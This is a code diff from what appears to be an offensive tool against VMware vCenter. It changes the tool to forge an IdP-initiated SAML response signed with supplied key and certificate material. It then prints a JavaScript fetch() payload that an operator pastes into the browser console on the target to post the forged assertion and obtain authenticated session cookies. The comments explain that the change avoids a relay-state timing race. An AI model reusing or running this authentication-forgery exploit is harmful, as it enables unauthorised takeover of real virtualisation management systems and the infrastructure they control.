@@ -2047,18 +2047,18 @@ def main():
                 if v:
                     print(f'    {extra}={v}')
 
-            # Fresh SAML for browser delivery — the console fetch runs same-origin
-            # from within the vCenter page, so vCenter sets HttpOnly cookies directly.
-            authn_id2, relay_state2 = get_saml_authn_request(target)
-            signed2   = build_and_sign_saml(target, hostname, domain,
-                                            key_pem, cert1_pem, cert2_pem, authn_id2)
-            saml_b64  = base64.b64encode(signed2).decode()
+            # IdP-initiated SAML (no InResponseTo, no RelayState) — vCenter accepts
+            # this and returns 302 → /ui/ directly.  No relay-state TTL to race.
+            # Run from DevTools console on any https://target/ page (same-origin so
+            # vCenter sets HttpOnly cookies directly into the browser's jar).
+            signed2  = build_and_sign_saml(target, hostname, domain,
+                                           key_pem, cert1_pem, cert2_pem, authn_id='')
+            saml_b64 = base64.b64encode(signed2).decode()
             js_cmd = ''.join([
                 "fetch('/ui/saml/websso/sso',{",
                 "method:'POST',credentials:'include',",
                 "headers:{'Content-Type':'application/x-www-form-urlencoded'},",
-                f"body:new URLSearchParams([['SAMLResponse',{json.dumps(saml_b64)}],",
-                f"['RelayState',{json.dumps(relay_state2)}]])",
+                f"body:new URLSearchParams([['SAMLResponse',{json.dumps(saml_b64)}]])",
                 "}).then(()=>location.replace('/ui/'));",
             ])
             print(f'\n[+] Open DevTools (F12) on https://{target}/ and paste in Console:')
